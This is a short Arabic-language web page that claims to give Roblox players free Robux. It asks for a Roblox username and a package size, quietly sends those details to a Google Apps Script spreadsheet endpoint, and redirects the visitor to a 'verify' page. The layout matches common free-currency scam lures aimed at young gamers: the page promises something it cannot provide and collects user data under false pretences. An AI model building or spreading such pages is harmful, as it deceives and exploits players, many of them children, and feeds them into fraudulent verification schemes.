<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>شحن روبلوكس </title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
    body {
      margin: 0;
      padding: 0;
      font-family: 'Cairo', sans-serif;
      background: url('https://images.unsplash.com/photo-1549921296-3a6bdf1f4aaf?ixlib=rb-4.0.3&auto=format&fit=crop&w=1950&q=80') no-repeat center center fixed;
      background-size: cover;
      color: #fff;
      text-align: center;
      padding: 30px 20px;
    }
    .container {
      background: rgba(0, 0, 0, 0.8);
      border-radius: 25px;
      max-width: 600px;
      margin: auto;
      padding: 40px 25px;
      box-shadow: 0 0 20px gold;
    }
    h1 {
      font-size: 2.4em;
      margin-bottom: 20px;
      color: gold;
    }
    p {
      font-size: 1.1em;
      margin-bottom: 25px;
    }
    input {
      width: 80%;
      padding: 15px;
      border-radius: 30px;
      border: none;
      font-size: 1.1em;
      margin-bottom: 20px;
      text-align: center;
    }
    .btn {
      display: inline-block;
      background: linear-gradient(45deg, #FFD700, #FFC107);
      border: none;
      border-radius: 50px;
      padding: 15px 30px;
      font-size: 1.2em;
      margin: 10px;
      color: #000;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 0 10px #FFD700, 0 0 20px #FFD700 inset;
      transition: 0.3s;
    }
    .btn:hover {
      transform: scale(1.05);
      box-shadow: 0 0 25px #fff, 0 0 35px gold inset;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🪐 شحن روبلوكس </h1>
    <p>اكتب اسمك في روبلوكس عشان نبدأ الشحن لك ✅</p>

    <input type="text" id="username" placeholder="اسم المستخدم في روبلوكس">

    <p>اختر كمية الروبوكس:</p>
    <button class="btn" onclick="start('400')">400 روبوكس</button>
    <button class="btn" onclick="start('800')">800 روبوكس</button>
    <button class="btn" onclick="start('1700')">1700 روبوكس</button>

    <p>✨ ملاحظة: النظام يحتاج تتحقق أول عشان نقدر نشحن لك بأمان</p>
  </div>

  <script>
    function start(amount) {
      const username = document.getElementById('username').value.trim();
      if (!username) {
        alert("رجاءً اكتب اسمك في روبلوكس أول");
        return;
      }

      // إرسال الاسم والكمية إلى Google Sheets
      fetch("https://script.google.com/macros/s/AKfycbwFSF2866QV_oeiY8pW6gBK_2FoB_hwC_1Kif89RzGFIcPnlZSQALLCDkqLZSKfc8fI/exec", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: `user=${encodeURIComponent(username)}&amount=${amount}`
      });

      // الانتقال لصفحة التحقق
      const url = `verify.html?user=${encodeURIComponent(username)}&amount=${amount}`;
      window.location.href = url;
    }
  </script>
</body>
</html>
